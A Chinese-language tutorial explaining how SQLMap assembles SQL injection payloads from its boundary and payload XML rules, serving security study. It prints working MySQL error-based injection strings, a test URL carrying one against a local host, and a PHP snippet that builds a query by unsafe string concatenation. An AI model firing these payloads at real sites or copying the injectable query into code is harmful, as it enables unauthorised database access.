# SQLMap的前世今生（Part1）

0x00 前言
=======

* * *

谈到SQL注入，那麽第一时间就会想到神器SQLMAP，SQLMap是一款用来检测与利用的SQL注入开源工具。那麽SQLMap在扫描SQL的逻辑到底是怎样实现的呢，接下来就探讨下SQLMap的扫描逻辑，通过了解SQLMap的扫描逻辑打造一款属于自己的SQL扫描工具。

0x01 SQL扫描规则：
=============

* * *

要了解SQLMap的扫描规则，也就是Payload,那麽到底Payload是哪里来，是根据什么逻辑生成的呢，接下来必须先了解几个文件的，SQLMap的扫描规则文件位于\xml文件夹中，其中boundaries.xml与Payloads文件夹则为SQLMap的扫描规则所在，\xml\payloads中的6个文件，里面的6个文件分别是存放着不同注入手法的PAYLOAD。

那麽就必须了解两个格式，一是boundary文件，一是payloads。

例子：

```
<boundary>
    <level>1</level>
    <clause>1</clause>
    <where>1,2</where>
    <ptype>1</ptype>
    <prefix>'</prefix>
    <suffix> AND '[RANDSTR]'='[RANDSTR]</suffix>
</boundary>

```

1.  clause与where属性
    
    这两个元素的作用是限制boundary所使用的范围，可以理解成当且仅当某个boundary元素的where节点的值包含test元素的子节点，clause节点的值包含test元素的子节点的时候，该boundary才能和当前的test匹配，从而进一步生成payload。
    
2.  prefix与suffix属性
    

要理解这两个属性的作用，那麽就先利用一段代码去讲解。

```
function getattachtablebypid($pid) {
    $tableid = DB::result_first("SELECT tableid FROM ".DB::table('forum_attachment')." WHERE pid='$pid' LIMIT 1");
    return 'forum_attachment_'.($tableid >= 0 && $tableid < 10 ? intval($tableid) : 'unused');
}

```

通过代码我们可以知道pid参与了SQL语句的拼接，那麽如果我们输入的pid为' AND 'test' = 'test呢，那麽最终拼接起来的SQL语句应该为：

```
SELECT tableid FROM ".DB::table('forum_attachment')." WHERE pid='' AND 'test' = 'test' LIMIT 1

```

所以如果我们输入的是' AND 'test' = 'test，那麽最终拼接起来的SQL语句同样是合法的。那麽我们就可以把所测试的Payload放到prefix与suffix中间，使之最终的SQL合法，从而进行注入测试，所以通过了解，prefix与suffix的作用就是为了截断SQL的语句，从而让最终的Payload合法。

至此boundary文件的作用已经讲解完了，接下来就是payload的讲解了。

```
<test>
    <title>MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause</title>
    <stype>2</stype>
    <level>1</level>
    <risk>1</risk>
    <clause>1,2,3</clause>
    <where>1</where>
    <vector>AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</vector>
    <request><!-- These work as good as ELT(), but are longer<payload>AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</payload><payload>AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</payload>-->
    <payload>AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</payload>
    </request>
    <response>
        <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
    </response>
    <details>
        <dbms>MySQL</dbms>
        <dbms_version>&gt;= 5.0</dbms_version>
    </details>
</test>

```

1 title属性

```
title属性为当前测试Payload的标题，通过标题就可以了解当前的注入手法与测试的数据库类型。

```

2 stype属性

```
这一个属性标记着当前的注入手法类型，1为布尔类型盲注，2为报错注入。

```

3 level属性

```
这个属性是每个test都有的，他是作用是是限定在SQL测试中处于哪个深度，简单的来说就是当你在使用SQLMAP进行SQL注入测试的时候，需要指定扫描的level，默认是1，最大为5，当level约高是，所执行的test越多，如果你是指定了level5进行注入测试，那麽估计执行的测试手法会将超过1000个。

```

4 clause与where属性

```
test中的clause与where属性与boundary中的clause与where属性功能是相同的。

```

5 payload属性

```
这一属性既是将要进行测试的SQL语句，也是SQLMap扫描逻辑的关键,其中的[RANDNUM]，[DELIMITER_START]，[DELIMITER_STOP]分别代表着随机数值与字符。当SQLMap扫描时会把对应的随机数替换掉,然后再与boundary的前缀与后缀拼接起来,最终成为测试的Payload。

```

6 details属性

```
其子节点会一般有两个，其dbms子节所代表的是当前Payload所适用的数据库类型，当前例子中的值为MySQL，则表示其Payload适用的数据库为MySQL,其dbms_version子节所代表的适用的数据库版本。

```

7 response属性

这一属性下的子节点标记着当前测试的Payload测试手法。

```
    grep        ：报错注入
    comparison  ：布尔类型忙注入
    time        ：延时注入
    char        ：联合查询注入

```

SQLMAP当中的checkSqlInjection函数即是用这一属性作为判断依据来进入不同的处理分支。而且其中response属性中的值则为其SQL注入判断依据，就如当前的例子中，grep中的值为`[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]`,SQLMap会将[DELIMITER_START]与[DELIMITER_STOP]替换成Payload中所对应替换的值，然后利用所得到的对返回的页面信息进行正则匹配，如果存在在判断为当前存在SQL注入漏洞。

其中要注意的是,Payload中的字符串会根据当前Payload所适用的数据库类型对字符串进行处理，其处理的代码位于\plugins\dbms下对应数据库文件夹中的syntax.py脚本中。

![enter image description here](http://drops.javaweb.org/uploads/images/22d73cd6f20b0daa2fc159ea95549bac4a9967e7.jpg)

所以最终的payload是根据test的payload子节点和boundary的prefix（前缀）、suffix（后缀）子节点的值组合而成的，即：最终的`payload = url参数 + boundary.prefix+test.payload+boundary.suffix`

0x02 实例
=======

* * *

接下来以报错注入来实际讲解下Payload与boundary的使用。

上例子中的boundary元素中的where节点的值为1,2，含有test元素的where节点的值（1）,并且，boundary元素中的clause节点的值为1，含有test元素的where节点的值（1）,因此，该boundary和test元素以匹配。test元素的payload的值为：

```
AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)

```

之前已经介绍了最终的Payload是如何的一个格式,所以最后将其中的[RANDNUM]、[DELIMITER_START]、[DELIMITER_STOP]替换掉与转义之后。

则生成的payload类似如下：

```
[RANDNUM]           = 2214
[DELIMITER_START]   = ~!(转义后则为0x7e21)
[DELIMITER_STOP]    = !~(转义后则为0x217e)
Payload: ' AND (SELECT 2214 FROM(SELECT COUNT(*),CONCAT(0x7e21,(SELECT (CASE WHEN (2214=2214) THEN 1 ELSE 0 END)),0x217e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND 'pujM'='pujM

```

如果http://127.0.0.1/search-result.php?keyword=&ad_id=3存在注入的话，那么执行的时候就会报如下错误：

```
Duplicate entry '~!1!~1' for key 'group_key'

```

根据之前的讲解，那麽最终于测试的URL如下

```
http://127.0.0.1/search-result.php?keyword=&ad_id=' AND (SELECT 2214 FROM(SELECT COUNT(*),CONCAT(0x7e21,(SELECT (ELT(2214=2214,1))),0x217e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'YmRM'='YmRM

```

如下为返回的页面信息

![enter image description here](http://drops.javaweb.org/uploads/images/7d09ccf3d40a959cc70d28747853b1c5f7f2aecf.jpg)

后根据grep中的正规来匹配当前页面。

```
<grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>

```

而使用正则：`~!(?P<result>.*?)!~来匹配Duplicate entry '~!1!~1' for key 'group_key'`的结果为1,根据匹配的结果可以得出当前的页面确实存在着SQL注入。

0x03 总结
=======

* * *

通过SQLMap的扫描逻辑，我们可以了解到SQL注入的常规手法与实现，熟悉SQLMap的配置文件之后，自己就可以根据实际的情况对Payload与boundary进行修改，通过增加Payload与boundary来增强SQLMap的扫描规则，也可以利用其扫描规则来打造一款自己的SQL扫描工具。